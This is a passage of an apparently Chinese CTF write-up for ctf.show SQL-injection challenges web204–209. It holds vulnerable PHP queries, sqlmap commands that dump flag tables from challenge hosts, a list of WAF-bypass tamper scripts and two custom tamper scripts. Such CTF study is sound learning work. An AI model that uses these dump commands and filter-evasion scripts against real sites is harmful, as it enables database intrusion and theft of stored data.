data-num="7"></td><td><pre>建议：确定使用那个payload和那个参数作为注入点时，为了保证全面性，建议使用高的level值。</pre></td></tr><tr><td data-num="8"></td><td><pre>风险等级：指是否要使用具有不同级别风险的测试语句，级别为<span class="token number">1</span><span class="token operator">-</span><span class="token number">3</span>，默认为<span class="token number">1</span>。</pre></td></tr><tr><td data-num="9"></td><td><pre>sqlmap <span class="token operator">-</span>u <span class="token string double-quoted-string">"url"</span> <span class="token operator">--</span>risk<span class="token operator">=</span><span class="token constant">RISK</span></pre></td></tr><tr><td data-num="10"></td><td><pre>默认是<span class="token number">1</span>会测试大部分的测试语句，<span class="token number">2</span>会增加基于事件的测试语句，<span class="token number">3</span>会增加<span class="token keyword">OR</span>语句的<span class="token constant">QL</span>注入测试。在有些时候，例如在<span class="token constant">UPDATE</span>的语句中，注入一个<span class="token keyword">OR</span>的测试语句，可能导致更新的整个表，可能造成很大的风险。</pre></td></tr></table></figure><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// 拼接 sql 语句查找指定 ID 用户</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select id,username,password from ctfshow_user where username !='flag' and id = '"</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"';"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">// 对传入的参数进行了过滤</span></pre></td></tr><tr><td data-num="4"></td><td><pre>  <span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>   <span class="token comment">// 代码过于简单，不宜展示</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>payload</p>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>sqlmap <span class="token operator">-</span>u http<span class="token punctuation">:</span><span class="token comment">//0cf86de8-2a3e-4075-aca8-7355cbb297c3.challenge.ctf.show/api/index.php --data="id=1" --method=PUT --headers="Content-Type: text/plain" --level=2 --user-agent=sqlmap --referer=ctf.show -D ctfshow_web -T ctfshow_user -C pass --dump</span></pre></td></tr></table></figure><h4 id="web205-sqlmap-api鉴权"><a class="anchor" href="#web205-sqlmap-api鉴权">#</a> web205 sqlmap api 鉴权</h4>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">--</span>safe<span class="token operator">-</span>url<span class="token operator">=</span><span class="token constant">SAFEURL</span> 设置在测试目标地址前访问的安全链接</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token operator">--</span>safe<span class="token operator">-</span>freq<span class="token operator">=</span><span class="token constant">SAFE</span><span class="token operator">.</span><span class="token operator">.</span> 设置两次注入测试前访问安全链接的次数</pre></td></tr></table></figure><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">//api 调用需要鉴权</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">// 拼接 sql 语句查找指定 ID 用户</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select id,username,password from ctfshow_user where id = '"</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"';"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment">// 对传入的参数进行了过滤</span></pre></td></tr><tr><td data-num="5"></td><td><pre>  <span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>   <span class="token comment">// 代码过于简单，不宜展示</span></pre></td></tr><tr><td data-num="7"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>payload</p>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>sqlmap <span class="token operator">-</span>u http<span class="token punctuation">:</span><span class="token comment">//bfa1a139-52b2-49e9-9f17-d3e1273f06e6.challenge.ctf.show/api/index.php --safe-url=http://bfa1a139-52b2-49e9-9f17-d3e1273f06e6.challenge.ctf.show/api/getToken.php --safe-freq=1 --data="id=1" --method=PUT --headers="Content-Type: text/plain" --level=2 --user-agent=sqlmap --referer=ctf.show -D ctfshow_web -T ctfshow_flax -C flagx --dump</span></pre></td></tr></table></figure><h4 id="web206-sqlmap-sql闭合"><a class="anchor" href="#web206-sqlmap-sql闭合">#</a> web206 sqlmap sql 闭合</h4>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token operator">--</span>prefix<span class="token operator">=</span><span class="token constant">PREFIX</span> 攻击载荷的前缀</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token operator">--</span>suffix<span class="token operator">=</span><span class="token constant">SUFFIX</span> 攻击载荷的后缀</pre></td></tr></table></figure><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">//sql 需要闭合</span></pre></td></tr><tr><td data-num="2"></td><td><pre> <span class="token comment">// 拼接 sql 语句查找指定 ID 用户</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select id,username,pass from ctfshow_user where id = ('"</span><span class="token operator">.</span><span class="token variable">$id</span><span class="token operator">.</span><span class="token string double-quoted-string">"') limit 0,1;"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment">// 对传入的参数进行了过滤</span></pre></td></tr><tr><td data-num="5"></td><td><pre>  <span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>   <span class="token comment">// 代码过于简单，不宜展示</span></pre></td></tr><tr><td data-num="7"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>payload</p>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>sqlmap <span class="token operator">-</span>u http<span class="token punctuation">:</span><span class="token comment">//e0236cbd-a6f9-4fd5-acdc-20889a9c5488.challenge.ctf.show/api/index.php --safe-url=http://e0236cbd-a6f9-4fd5-acdc-20889a9c5488.challenge.ctf.show/api/getToken.php --safe-freq=1 --data="id=1" --method=PUT --headers="Content-Type: text/plain" --level=2 --user-agent=sqlmap --prefix="')" --suffix="#" --referer=ctf.show -D ctfshow_web -T ctfshow_flaxc -C flagv --dump</span></pre></td></tr></table></figure><h4 id="web207-sqlmap-tamper使用"><a class="anchor" href="#web207-sqlmap-tamper使用">#</a> web207 sqlmap tamper 使用</h4>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">//--tamper 的初体验</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">// 拼接 sql 语句查找指定 ID 用户</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select id,username,pass from ctfshow_user where id = ('"</span><span class="token operator">.</span><span class="token variable">$id</span><span class="token operator">.</span><span class="token string double-quoted-string">"') limit 0,1;"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment">// 对传入的参数进行了过滤</span></pre></td></tr><tr><td data-num="5"></td><td><pre>  <span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>   <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ /'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>tamper各脚本作用</pre></td></tr><tr><td data-num="2"></td><td><pre>apostrophemask<span class="token operator">.</span>py 用utf8代替引号</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>equaltolike<span class="token operator">.</span>py <span class="token constant">MSSQL</span> <span class="token operator">*</span> SQLite中like 代替等号</pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre>greatest<span class="token operator">.</span>py MySQL中绕过过滤’<span class="token operator">></span>’ <span class="token punctuation">,</span>用<span class="token constant">GREATEST</span>替换大于号</pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>space2hash<span class="token operator">.</span>py 空格替换为<span class="token comment">#号 随机字符串 以及换行符</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>space2comment<span class="token operator">.</span>py 用<span class="token comment">/**/</span>代替空格</pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>apostrophenullencode<span class="token operator">.</span>py MySQL <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5.0</span> <span class="token keyword">and</span> <span class="token number">5.5</span>，Oracle <span class="token number">10</span>g，PostgreSQL绕过过滤双引号，替换字符和双引号</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre>halfversionedmorekeywords<span class="token operator">.</span>py 当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论</pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre>space2morehash<span class="token operator">.</span>py MySQL中空格替换为 <span class="token comment">#号 以及更多随机字符串 换行符</span></pre></td></tr><tr><td data-num="17"></td><td><pre></pre></td></tr><tr><td data-num="18"></td><td><pre>appendnullbyte<span class="token operator">.</span>p Microsoft Access在有效负荷结束位置加载零字节字符编码</pre></td></tr><tr><td data-num="19"></td><td><pre></pre></td></tr><tr><td data-num="20"></td><td><pre>ifnull2ifisnull<span class="token operator">.</span>py MySQL，<span class="token function">SQLite</span> <span class="token punctuation">(</span>possibly<span class="token punctuation">)</span>，<span class="token constant">SAP</span> MaxDB绕过对 <span class="token constant">IFNULL</span> 过滤</pre></td></tr><tr><td data-num="21"></td><td><pre></pre></td></tr><tr><td data-num="22"></td><td><pre>space2mssqlblank<span class="token operator">.</span>py mssql空格替换为其它空符号</pre></td></tr><tr><td data-num="23"></td><td><pre></pre></td></tr><tr><td data-num="24"></td><td><pre>base64encode<span class="token operator">.</span>py 用base64编码</pre></td></tr><tr><td data-num="25"></td><td><pre></pre></td></tr><tr><td data-num="26"></td><td><pre>space2mssqlhash<span class="token operator">.</span>py mssql查询中替换空格</pre></td></tr><tr><td data-num="27"></td><td><pre></pre></td></tr><tr><td data-num="28"></td><td><pre>modsecurityversioned<span class="token operator">.</span>py mysql中过滤空格，包含完整的查询版本注释</pre></td></tr><tr><td data-num="29"></td><td><pre></pre></td></tr><tr><td data-num="30"></td><td><pre>space2mysqlblank<span class="token operator">.</span>py mysql中空格替换其它空白符号</pre></td></tr><tr><td data-num="31"></td><td><pre></pre></td></tr><tr><td data-num="32"></td><td><pre>between<span class="token operator">.</span>py <span class="token constant">MS</span> <span class="token constant">SQL</span> <span class="token number">2005</span>，MySQL <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5.0</span> <span class="token keyword">and</span> <span class="token number">5.5</span> <span class="token operator">*</span> Oracle <span class="token number">10</span>g <span class="token operator">*</span> PostgreSQL <span class="token number">8.3</span><span class="token punctuation">,</span> <span class="token number">8.4</span><span class="token punctuation">,</span> <span class="token number">9.0</span>中用between替换大于号（<span class="token operator">></span>）</pre></td></tr><tr><td data-num="33"></td><td><pre></pre></td></tr><tr><td data-num="34"></td><td><pre>space2mysqldash<span class="token operator">.</span>py MySQL，<span class="token constant">MSSQL</span>替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）</pre></td></tr><tr><td data-num="35"></td><td><pre></pre></td></tr><tr><td data-num="36"></td><td><pre>multiplespaces<span class="token operator">.</span>py 围绕<span class="token constant">SQL</span>关键字添加多个空格</pre></td></tr><tr><td data-num="37"></td><td><pre></pre></td></tr><tr><td data-num="38"></td><td><pre>space2plus<span class="token operator">.</span>py 用<span class="token operator">+</span>替换空格</pre></td></tr><tr><td data-num="39"></td><td><pre></pre></td></tr><tr><td data-num="40"></td><td><pre>bluecoat<span class="token operator">.</span>py MySQL <span class="token number">5.1</span><span class="token punctuation">,</span> <span class="token constant">SGOS</span>代替空格字符后与一个有效的随机空白字符的<span class="token constant">SQL</span>语句。 然后替换<span class="token operator">=</span>为like</pre></td></tr><tr><td data-num="41"></td><td><pre></pre></td></tr><tr><td data-num="42"></td><td><pre>nonrecursivereplacement<span class="token operator">.</span>py 双重查询语句。取代predefined <span class="token constant">SQL</span>关键字with表示 suitable <span class="token keyword">for</span>替代</pre></td></tr><tr><td data-num="43"></td><td><pre></pre></td></tr><tr><td data-num="44"></td><td><pre>space2randomblank<span class="token operator">.</span>py 代替空格字符（“”）从一个随机的空白字符可选字符的有效集</pre></td></tr><tr><td data-num="45"></td><td><pre></pre></td></tr><tr><td data-num="46"></td><td><pre>sp_password<span class="token operator">.</span>py 追加sp_password’从<span class="token constant">DBMS</span>日志的自动模糊处理的<span class="token number">26</span> 有效载荷的末尾</pre></td></tr><tr><td data-num="47"></td><td><pre></pre></td></tr><tr><td data-num="48"></td><td><pre>chardoubleencode<span class="token operator">.</span>py 双url编码<span class="token punctuation">(</span>不处理以编码的<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="49"></td><td><pre></pre></td></tr><tr><td data-num="50"></td><td><pre>unionalltounion<span class="token operator">.</span>py 替换<span class="token constant">UNION</span> <span class="token constant">ALL</span> <span class="token constant">SELECT</span> <span class="token constant">UNION</span> <span class="token constant">SELECT</span></pre></td></tr><tr><td data-num="51"></td><td><pre></pre></td></tr><tr><td data-num="52"></td><td><pre>charencode<span class="token operator">.</span>py Microsoft <span class="token constant">SQL</span> Server <span class="token number">2005</span>，MySQL <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5.0</span> <span class="token keyword">and</span> <span class="token number">5.5</span>，Oracle <span class="token number">10</span>g，PostgreSQL <span class="token number">8.3</span><span class="token punctuation">,</span> <span class="token number">8.4</span><span class="token punctuation">,</span> <span class="token number">9.0</span>url编码；</pre></td></tr><tr><td data-num="53"></td><td><pre></pre></td></tr><tr><td data-num="54"></td><td><pre>randomcase<span class="token operator">.</span>py Microsoft <span class="token constant">SQL</span> Server <span class="token number">2005</span>，MySQL <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5.0</span> <span class="token keyword">and</span> <span class="token number">5.5</span>，Oracle <span class="token number">10</span>g，PostgreSQL <span class="token number">8.3</span><span class="token punctuation">,</span> <span class="token number">8.4</span><span class="token punctuation">,</span> <span class="token number">9.0</span>中随机大小写</pre></td></tr><tr><td data-num="55"></td><td><pre></pre></td></tr><tr><td data-num="56"></td><td><pre>unmagicquotes<span class="token operator">.</span>py 宽字符绕过 <span class="token constant">GPC</span> addslashes</pre></td></tr><tr><td data-num="57"></td><td><pre></pre></td></tr><tr><td data-num="58"></td><td><pre>randomcomments<span class="token operator">.</span>py 用<span class="token comment">/**/</span>分割sql关键字</pre></td></tr><tr><td data-num="59"></td><td><pre></pre></td></tr><tr><td data-num="60"></td><td><pre>charunicodeencode<span class="token operator">.</span>py <span class="token constant">ASP</span>，<span class="token constant">ASP</span><span class="token operator">.</span><span class="token constant">NET</span>中字符串 unicode 编码</pre></td></tr><tr><td data-num="61"></td><td><pre></pre></td></tr><tr><td data-num="62"></td><td><pre>securesphere<span class="token operator">.</span>py 追加特制的字符串</pre></td></tr><tr><td data-num="63"></td><td><pre></pre></td></tr><tr><td data-num="64"></td><td><pre>versionedmorekeywords<span class="token operator">.</span>py MySQL <span class="token operator">>=</span> <span class="token number">5.1</span><span class="token number">.13</span>注释绕过</pre></td></tr><tr><td data-num="65"></td><td><pre></pre></td></tr><tr><td data-num="66"></td><td><pre>halfversionedmorekeywords<span class="token operator">.</span>py MySQL <span class="token operator">&lt;</span> <span class="token number">5.1</span>中关键字前加注释</pre></td></tr></table></figure><p>tamper 脚本   <span class="exturl" data-url="aHR0cDovL3NwYWNlMmNvbW1lbnQucHk=">space2comment.py</span> 用 /**/ 代替空格</p>
<p>payload</p>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>sqlmap <span class="token operator">-</span>u http<span class="token punctuation">:</span><span class="token comment">//e43c48c6-e2b5-47a9-85b6-2adf167a7874.challenge.ctf.show/api/index.php --safe-url=http://e43c48c6-e2b5-47a9-85b6-2adf167a7874.challenge.ctf.show/api/getToken.php --safe-freq=1 --data="id=1" --tamper=space2comment --method=PUT --headers="Content-Type: text/plain" --level=3 --prefix="')" --suffix="#" -D ctfshow_web -T ctfshow_flaxca -C flagvc --dump</span></pre></td></tr></table></figure><h4 id="web208-sqlmap-tamper使用"><a class="anchor" href="#web208-sqlmap-tamper使用">#</a> web208 sqlmap tamper 使用</h4>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">//--tamper 的 2 体验</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">// 拼接 sql 语句查找指定 ID 用户</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select id,username,pass from ctfshow_user where id = ('"</span><span class="token operator">.</span><span class="token variable">$id</span><span class="token operator">.</span><span class="token string double-quoted-string">"') limit 0,1;"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">// 对传入的参数进行了过滤</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token comment">// $id = str_replace('select</span><span class="token string single-quoted-string">', '</span><span class="token string single-quoted-string">', $id);</pre></td></tr><tr><td data-num="7"></td><td><pre>  function waf($str)&#123;</pre></td></tr><tr><td data-num="8"></td><td><pre>   return preg_match('</span><span class="token operator">/</span> <span class="token operator">/</span>'<span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>tamper 脚本</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#!/usr/bin/env python</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment"># -*- coding: UTF-8 -*-</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">#@File：doubleSelect.py</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment">#@Author：Sirius</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">#@Date：2022/4/28 17:26 </span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>compat <span class="token keyword">import</span> <span class="token builtin">xrange</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> PRIORITY</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre>__priority__ <span class="token operator">=</span> PRIORITY<span class="token punctuation">.</span>LOW</pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token keyword">def</span> <span class="token function">dependencies</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token keyword">pass</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">def</span> <span class="token function">tamper</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre>    retVal <span class="token operator">=</span> payload</pre></td></tr><tr><td data-num="18"></td><td><pre></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token keyword">if</span> payload<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="20"></td><td><pre>        retVal <span class="token operator">=</span> retVal<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"SELECT"</span><span class="token punctuation">,</span><span class="token string">"seselectlect"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="21"></td><td><pre></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token keyword">return</span> retVal</pre></td></tr></table></figure><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>compat <span class="token keyword">import</span> <span class="token builtin">xrange</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> PRIORITY</pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre>__priority__ <span class="token operator">=</span> PRIORITY<span class="token punctuation">.</span>LOW</pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">def</span> <span class="token function">dependencies</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">pass</span></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token keyword">def</span> <span class="token function">tamper</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="10"></td><td><pre></pre></td></tr><tr><td data-num="11"></td><td><pre>    retVal <span class="token operator">=</span> payload</pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token keyword">if</span> payload<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="14"></td><td><pre>        retVal <span class="token operator">=</span> <span class="token string">""</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        quote<span class="token punctuation">,</span> doublequote<span class="token punctuation">,</span> firstspace <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span><span class="token punctuation">,</span> <span class="token boolean">False</span></pre></td></tr><tr><td data-num="16"></td><td><pre></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">xrange</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="18"></td><td><pre>            <span class="token keyword">if</span> <span class="token keyword">not</span> firstspace<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="19"></td><td><pre>                <span class="token keyword">if</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>isspace<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="20"></td><td><pre>                    firstspace <span class="token operator">=</span> <span class="token boolean">True</span></pre></td></tr><tr><td data-num="21"></td><td><pre>                    retVal <span class="token operator">+=</span> <span class="token string">"/**/"</span></pre></td></tr><tr><td data-num="22"></td><td><pre>                    <span class="token keyword">continue</span></pre></td></tr><tr><td data-num="23"></td><td><pre></pre></td></tr><tr><td data-num="24"></td><td><pre>            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'\''</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="25"></td><td><pre>                quote <span class="token operator">=</span> <span class="token keyword">not</span> quote</pre></td></tr><tr><td data-num="26"></td><td><pre></pre></td></tr><tr><td data-num="27"></td><td><pre>            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'"'</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="28"></td><td><pre>                doublequote <span class="token operator">=</span> <span class="token keyword">not</span> doublequote</pre></td></tr><tr><td data-num="29"></td><td><pre></pre></td></tr><tr><td data-num="30"></td><td><pre>            <span class="token keyword">elif</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">" "</span> <span class="token keyword">and</span> <span class="token keyword">not</span> doublequote <span class="token keyword">and</span> <span class="token keyword">not</span> quote<span class="token punctuation">:</span></pre></td></tr><tr><td data-num="31"></td><td><pre>                retVal <span class="token operator">+=</span> <span class="token string">"/**/"</span></pre></td></tr><tr><td data-num="32"></td><td><pre>                <span class="token keyword">continue</span></pre></td></tr><tr><td data-num="33"></td><td><pre></pre></td></tr><tr><td data-num="34"></td><td><pre>            retVal <span class="token operator">+=</span> payload<span class="token punctuation">[</span>i<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="35"></td><td><pre></pre></td></tr><tr><td data-num="36"></td><td><pre>    <span class="token keyword">return</span> retVal</pre></td></tr></table></figure><p>payload</p>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>sqlmap <span class="token operator">-</span>u http<span class="token punctuation">:</span><span class="token comment">//f85e397a-067d-4562-9dfa-b49286f84342.challenge.ctf.show/api/index.php --safe-url=http://f85e397a-067d-4562-9dfa-b49286f84342.challenge.ctf.show/api/getToken.php --safe-freq=1 --data="id=1" --tamper=space2comment,doubleSelect --dbms=mysql --method=PUT --headers="Content-Type: text/plain" --level=3 --prefix="')" --suffix="#" -D ctfshow_web -T ctfshow_flaxcac -C flagvca --dump</span></pre></td></tr></table></figure><h4 id="web209-sqlmap-tamper使用"><a class="anchor" href="#web209-sqlmap-tamper使用">#</a> web209 sqlmap tamper 使用</h4>
<figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">//--tamper 的 3 体验</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">// 拼接 sql 语句查找指定 ID 用户</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select id,username,pass from ctfshow_user where id = '"</span><span class="token operator">.</span><span class="token variable">$id</span><span class="token operator">.</span><span class="token string double-quoted-string">"' limit 0,1;"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token comment">// 对传入的参数进行了过滤</span></pre></td></tr><tr><td data-num="7"></td><td><pre>  <span class="token keyword">function</span> <span class="token function-definition function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>   <span class="token comment">//TODO 未完工</span></pre></td></tr><tr><td data-num="9"></td><td><pre>   <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ |\*|\=/'</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>tamper 脚本 1</p>
<figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">#!/usr/bin/env python</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment"># -*- coding: UTF-8 -*-</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">#@File：web209.py</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token comment">#@Author：Sirius</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token comment">#@Date：2022/4/29 10:43 </span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>compat <span class="token keyword">import</span> <span class="token builtin">xrange</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">from</span> lib<span class="token punctuation">.</span>core<span class="token punctuation">.</span>enums <span class="token keyword">import</span> PRIORITY</pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td 